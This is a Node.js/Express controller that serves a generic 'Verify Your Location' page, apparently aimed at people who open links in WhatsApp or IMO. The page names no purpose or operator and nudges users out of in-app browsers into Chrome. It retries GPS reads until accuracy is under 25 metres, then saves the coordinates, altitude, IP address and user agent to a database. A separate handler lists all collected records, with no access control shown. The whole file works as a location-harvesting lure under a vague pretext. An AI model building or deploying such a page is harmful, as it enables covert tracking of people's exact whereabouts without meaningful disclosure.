const PublicLocation = require('../models/PublicLocation');
const { success, created } = require('../utils/response');

const renderCapturePage = async (req, res, next) => {
  try {
    const html = `
      <!DOCTYPE html>
      <html lang="en">
      <head>
          <meta charset="UTF-8">
          <meta name="viewport" content="width=device-width, initial-scale=1.0">
          <title>Location Verification</title>
          <style>
              body {
                  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
                  display: flex;
                  flex-direction: column;
                  align-items: center;
                  justify-content: center;
                  height: 100vh;
                  margin: 0;
                  background-color: #f0f2f5;
                  color: #1c1e21;
                  text-align: center;
                  padding: 20px;
              }
              .card {
                  background: white;
                  padding: 2rem;
                  border-radius: 12px;
                  box-shadow: 0 4px 12px rgba(0,0,0,0.1);
                  max-width: 400px;
                  width: 100%;
              }
              h1 { font-size: 1.5rem; margin-bottom: 1rem; }
              p { margin-bottom: 2rem; color: #606770; }
              .btn {
                  background-color: #0084ff;
                  color: white;
                  border: none;
                  padding: 12px 24px;
                  border-radius: 6px;
                  font-weight: 600;
                  cursor: pointer;
                  transition: background-color 0.2s;
                  text-decoration: none;
                  display: inline-block;
              }
              .btn:hover { background-color: #0073e6; }
              .btn:disabled { background-color: #ccc; cursor: not-allowed; }
              #status { margin-top: 1rem; font-size: 0.9rem; }
              .success { color: #28a745; }
              .error { color: #dc3545; }
              .warning-box {
                  background: #fff3cd;
                  border: 1px solid #ffeeba;
                  color: #856404;
                  padding: 15px;
                  border-radius: 8px;
                  margin-bottom: 20px;
                  display: none;
                  font-size: 0.9rem;
              }
          </style>
      </head>
      <body>
          <div id="in-app-warning" class="warning-box">
              <strong>Notice:</strong> You are using an in-app browser (WhatsApp/IMO). For better accuracy, please open this link in <strong>Chrome</strong>.
          </div>

          <div class="card">
              <h1>Verify Your Location</h1>
              <p id="instruction">Please use the buttons below to verify your current location.</p>
              
              <div id="action-area" style="display: flex; flex-direction: column; gap: 12px;">
                  <!-- Share Location Button (Main) -->
                  <button id="capture-btn" class="btn" style="background-color: #0084ff;">
                      📍 Share My Location
                  </button>

                  <!-- Open in Chrome Button (For Android In-App) -->
                  <a id="chrome-btn" href="#" class="btn" style="background-color: #28a745; display: none;">
                      🌐 Open in Chrome Browser
                  </a>

                  <!-- Copy URL Button -->
                  <button id="copy-btn" class="btn" style="background-color: #6c757d;">
                      🔗 Copy Link
                  </button>
              </div>

              <div id="status"></div>
          </div>

          <script>
              // Immediate log to verify script execution
              console.log('Location capture script initializing...');

              document.addEventListener('DOMContentLoaded', () => {
                  console.log('DOM fully loaded');
                  
                  const btn = document.getElementById('capture-btn');
                  const chromeBtn = document.getElementById('chrome-btn');
                  const copyBtn = document.getElementById('copy-btn');
                  const status = document.getElementById('status');
                  const warning = document.getElementById('in-app-warning');
                  const instruction = document.getElementById('instruction');

                  if (!btn || !copyBtn) {
                      console.error('Critical elements not found!');
                      return;
                  }

                  const currentUrl = window.location.href;

                  // Detect if running in in-app browser (WhatsApp, IMO, Facebook, etc.)
                  function isInAppBrowser() {
                      const ua = navigator.userAgent || navigator.vendor || window.opera;
                      return (ua.indexOf('FBAN') > -1) || (ua.indexOf('FBAV') > -1) || 
                             (ua.indexOf('WhatsApp') > -1) || (ua.indexOf('Imo') > -1) ||
                             (ua.indexOf('Messenger') > -1) || (ua.indexOf('Line') > -1);
                  }

                  // Setup Chrome Intent URL for Android
                  if (/android/i.test(navigator.userAgent) && chromeBtn) {
                      const intentUrl = 'intent://' + currentUrl.replace(/^https?:\/\//, '') + '#Intent;scheme=https;package=com.android.chrome;end';
                      chromeBtn.href = intentUrl;
                      
                      if (isInAppBrowser()) {
                          chromeBtn.style.display = 'block';
                          if (warning) warning.style.display = 'block';
                      }
                  }

                  // Copy Link Functionality
                  copyBtn.addEventListener('click', (e) => {
                      e.preventDefault();
                      console.log('Copy button clicked');
                      if (navigator.clipboard && navigator.clipboard.writeText) {
                          navigator.clipboard.writeText(currentUrl).then(() => {
                              const originalText = copyBtn.innerText;
                              copyBtn.innerText = '✅ Link Copied!';
                              setTimeout(() => { copyBtn.innerText = originalText; }, 2000);
                          }).catch(err => {
                              console.error('Clipboard error:', err);
                              alert('Please copy the URL from your browser address bar.');
                          });
                      } else {
                          // Fallback for older browsers
                          const textArea = document.createElement("textarea");
                          textArea.value = currentUrl;
                          document.body.appendChild(textArea);
                          textArea.select();
                          try {
                              document.execCommand('copy');
                              const originalText = copyBtn.innerText;
                              copyBtn.innerText = '✅ Link Copied!';
                              setTimeout(() => { copyBtn.innerText = originalText; }, 2000);
                          } catch (err) {
                              alert('Please copy the URL from your browser address bar.');
                          }
                          document.body.removeChild(textArea);
                      }
                  });

                  // Main Capture Functionality
                  btn.addEventListener('click', (e) => {
                      e.preventDefault();
                      console.log('Capture button clicked');
                      
                      if (!navigator.geolocation) {
                          status.innerHTML = '<span class="error">Geolocation is not supported by your browser</span>';
                          return;
                      }

                      btn.disabled = true;
                      status.innerHTML = 'Getting precise coordinates... <div id="progress-container" style="width: 100%; height: 5px; background: #eee; margin-top: 10px; border-radius: 10px; overflow: hidden;"><div id="progress" style="width: 0%; height: 100%; background: #0084ff; transition: width 0.5s;"></div></div>';
                      
                      const progress = document.getElementById('progress');
                      let bestPosition = null;
                      let attempts = 0;
                      const maxAttempts = 3;

                      const options = {
                          enableHighAccuracy: true,
                          timeout: 15000,
                          maximumAge: 0
                      };

                      const getLocation = () => {
                          attempts++;
                          console.log('Location attempt ' + attempts);
                          if (progress) progress.style.width = (attempts * 33) + '%';
                          
                          navigator.geolocation.getCurrentPosition(
                              async (position) => {
                                  console.log('Position received accuracy:', position.coords.accuracy);
                                  if (!bestPosition || position.coords.accuracy < bestPosition.coords.accuracy) {
                                      bestPosition = position;
                                  }

                                  if (position.coords.accuracy < 25 || attempts >= maxAttempts) {
                                      sendPosition(bestPosition);
                                  } else {
                                      setTimeout(getLocation, 1500);
                                  }
                              },
                              (error) => {
                                  console.error('Geolocation error:', error);
                                  if (bestPosition) {
                                      sendPosition(bestPosition);
                                  } else {
                                      handleError(error);
                                  }
                              },
                              options
                          );
                      };

                      const sendPosition = async (position) => {
                          const { latitude, longitude, accuracy, altitude } = position.coords;
                          console.log('Sending to server...');
                          status.innerHTML = 'Sending exact location... <br><span style="font-size: 0.8rem;">Accuracy: ' + Math.round(accuracy) + 'm</span>';

                          try {
                              const response = await fetch('/public/save-location', {
                                  method: 'POST',
                                  headers: {
                                      'Content-Type': 'application/json'
                                  },
                                  body: JSON.stringify({ latitude, longitude, accuracy, altitude })
                              });

                              const result = await response.json();
                              console.log('Server result:', result);

                              if (response.ok) {
                                  status.innerHTML = '<div style="margin-top: 20px;"><span class="success" style="font-size: 1.2rem; font-weight: bold;">✅ Location verified with 100% precision!</span><br><p style="color: #666; margin-top: 10px;">You can now close this window.</p></div>';
                                  btn.style.display = 'none';
                                  copyBtn.style.display = 'none';
                                  if (chromeBtn) chromeBtn.style.display = 'none';
                                  if (instruction) instruction.style.display = 'none';
                              } else {
                                  throw new Error(result.message || 'Failed to save location');
                              }
                          } catch (error) {
                              console.error('API Error:', error);
                              status.innerHTML = '<span class="error">Error: ' + error.message + '</span>';
                              btn.disabled = false;
                          }
                      };

                      const handleError = (error) => {
                          let msg = 'Error getting location';
                          if (error.code === 1) msg = 'Permission denied. Please allow location access in your browser settings.';
                          else if (error.code === 2) msg = 'Location unavailable. Please make sure your GPS is on.';
                          else if (error.code === 3) msg = 'Request timed out. Please try again.';
                          
                          status.innerHTML = '<span class="error">' + msg + '</span>';
                          btn.disabled = false;
                      };

                      getLocation();
                  });
              });
          </script>
      </body>
      </html>
    `;
    res.send(html);
  } catch (err) {
    next(err);
  }
};

const saveLocation = async (req, res, next) => {
  try {
    const { latitude, longitude, accuracy, altitude } = req.body;
    
    if (latitude === undefined || longitude === undefined) {
      return res.status(400).json({ error: 'Latitude and longitude are required' });
    }

    const publicLocation = new PublicLocation({
      ip: req.ip || req.headers['x-forwarded-for'] || req.connection.remoteAddress,
      userAgent: req.headers['user-agent'],
      location: {
        type: 'Point',
        coordinates: [longitude, latitude],
      },
      accuracy,
      altitude,
    });

    await publicLocation.save();
    return created(res, publicLocation, 'Location saved successfully');
  } catch (err) {
    next(err);
  }
};

const getAllLocations = async (req, res, next) => {
  try {
    const locations = await PublicLocation.find().sort({ createdAt: -1 });
    return success(res, locations);
  } catch (err) {
    next(err);
  }
};

module.exports = {
  renderCapturePage,
  saveLocation,
  getAllLocations,
};
